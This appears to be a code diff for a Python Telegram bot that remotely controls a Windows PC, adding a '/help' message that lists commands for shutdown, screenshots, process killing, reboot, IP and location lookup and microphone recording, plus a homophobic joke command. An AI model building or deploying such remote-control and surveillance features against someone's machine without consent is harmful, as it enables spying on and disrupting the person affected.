@@ -15,7 +15,13 @@ def commands(message):
                 bot.send_message(message.chat.id,'Компьютер будет выключен!')
                 os.system('shutdown -s')
 
+        
+        elif message.text == '/help':
+                 bot.send_message(message.chat.id,'/off(выкл пк)\n/open(открыть ссылку в браузере)\n/screen(сделать скриншот экрана)\n/process(включить процесс)\n/kill(убить процесс)\n/reboot(перезагрузить пк)\n/window(тест на гея)\n/ip(узнать ip,город,браузер)\n/rep(запустить файл.mp3)\n/record(записать звки с микрофона)')
+                
 
+              
+        
         elif message.text == '/open':
                 bot.register_next_step_handler(message,get_url)
                 bot.send_message(message.chat.id,'Отправьте ссылку!')
